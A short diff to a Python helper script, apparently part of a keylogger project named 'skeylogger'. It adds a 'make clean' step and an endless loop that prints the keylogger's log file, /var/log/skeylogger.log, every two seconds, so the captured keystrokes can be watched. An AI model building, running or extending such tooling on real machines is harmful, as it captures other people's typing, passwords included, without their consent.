@@ -1,4 +1,4 @@
-import os
+import os, time
 
 def r(command):
 	os.system(command)
@@ -21,6 +21,11 @@ def main():
 	
 	# Clean
 	r("rm ~/a.out ~/skeylogger")
+	r("make clean")
+	
+	while (True):
+		r("cat /var/log/skeylogger.log")
+		time.sleep(2)	
 
 if __name__ == "__main__":
 	main()
